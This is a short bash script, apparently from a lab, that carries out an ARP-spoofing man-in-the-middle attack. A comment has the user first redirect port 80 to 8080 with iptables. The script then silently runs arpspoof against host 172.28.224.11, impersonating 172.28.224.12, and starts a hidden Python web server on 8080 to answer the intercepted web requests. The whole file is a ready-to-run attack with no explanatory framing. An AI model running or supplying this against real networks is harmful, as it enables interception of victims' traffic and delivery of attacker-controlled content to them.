#!/bin/bash


# Execute "iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080" first

arpspoof -i eth0 -t 172.28.224.11 172.28.224.12 2>/dev/null 1>/dev/null &
python3 -m http.server 8080 2>/dev/null 1>/dev/null &
